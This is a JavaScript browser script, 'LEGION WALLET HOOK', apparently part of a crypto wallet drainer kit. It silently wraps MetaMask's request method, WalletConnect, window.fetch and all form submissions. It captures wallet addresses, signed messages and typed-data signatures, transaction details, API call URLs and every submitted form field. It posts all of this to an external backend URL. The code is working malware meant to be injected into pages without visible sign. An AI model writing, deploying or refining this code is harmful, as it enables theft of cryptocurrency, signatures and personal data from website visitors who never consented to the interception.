/**
 * LEGION WALLET HOOK
 * Perfectly intercepts wallet connections
 * No visible UI, just pure interception
 */

(function() {
  const BACKEND = window.__LEGION_DRAIN__?.backend || 'https://legionapi-production.up.railway.app'

  // Intercept MetaMask
  if (window.ethereum) {
    const originalRequest = window.ethereum.request.bind(window.ethereum)

    window.ethereum.request = async function(args) {
      console.log('[LEGION] Wallet request:', args.method)

      // Intercept eth_requestAccounts
      if (args.method === 'eth_requestAccounts') {
        const accounts = await originalRequest(args)
        console.log('[LEGION] Account connected:', accounts[0])
        notifyBackend('account_connected', {
          wallet: accounts[0],
          method: 'eth_requestAccounts'
        })
        return accounts
      }

      // Intercept personal_sign
      if (args.method === 'personal_sign') {
        const result = await originalRequest(args)
        console.log('[LEGION] Signature captured')
        notifyBackend('signature_captured', {
          wallet: window.ethereum.selectedAddress,
          message: args.params[0],
          signature: result,
          method: 'personal_sign'
        })
        return result
      }

      // Intercept eth_signTypedData_v4
      if (args.method === 'eth_signTypedData_v4') {
        const result = await originalRequest(args)
        console.log('[LEGION] Typed data signed')
        notifyBackend('typed_data_signed', {
          wallet: window.ethereum.selectedAddress,
          data: args.params[1],
          signature: result,
          method: 'eth_signTypedData_v4'
        })
        return result
      }

      // Intercept eth_sendTransaction
      if (args.method === 'eth_sendTransaction') {
        const tx = args.params[0]
        console.log('[LEGION] Transaction requested:', tx)
        notifyBackend('transaction_requested', {
          wallet: window.ethereum.selectedAddress,
          to: tx.to,
          value: tx.value,
          data: tx.data,
          from: tx.from,
          method: 'eth_sendTransaction'
        })
        return originalRequest(args)
      }

      return originalRequest(args)
    }
  }

  // Intercept WalletConnect
  if (window.WalletConnect) {
    const original = window.WalletConnect
    window.WalletConnect = function(...args) {
      console.log('[LEGION] WalletConnect initialized')
      const wc = new original(...args)

      const originalSend = wc.sendTransaction.bind(wc)
      wc.sendTransaction = async function(tx) {
        console.log('[LEGION] WalletConnect transaction:', tx)
        notifyBackend('walletconnect_transaction', {
          wallet: wc.accounts[0],
          tx: tx,
          method: 'walletconnect'
        })
        return originalSend(tx)
      }

      return wc
    }
  }

  // Intercept all fetch calls
  const originalFetch = window.fetch
  window.fetch = function(...args) {
    const url = args[0]
    const options = args[1] || {}

    console.log('[LEGION] API call:', url)
    notifyBackend('api_call_logged', {
      url: url,
      method: options.method || 'GET',
      timestamp: Date.now()
    }).catch(() => {})

    return originalFetch.apply(this, args)
  }

  // Intercept form submissions
  document.addEventListener('submit', function(e) {
    const form = e.target
    const formData = new FormData(form)
    const data = Object.fromEntries(formData)

    console.log('[LEGION] Form submitted:', data)
    notifyBackend('form_submitted', {
      action: form.action,
      data: data,
      timestamp: Date.now()
    }).catch(() => {})
  }, true)

  // Helper to notify backend
  async function notifyBackend(event, data) {
    try {
      await fetch(`${BACKEND}/api/v1/clone-event`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event: event,
          data: data,
          timestamp: Date.now(),
          url: window.location.href
        })
      })
    } catch (e) {
      console.log('[LEGION] Notification failed (non-blocking):', e.message)
    }
  }

  console.log('[LEGION] Wallet hook active')
})()
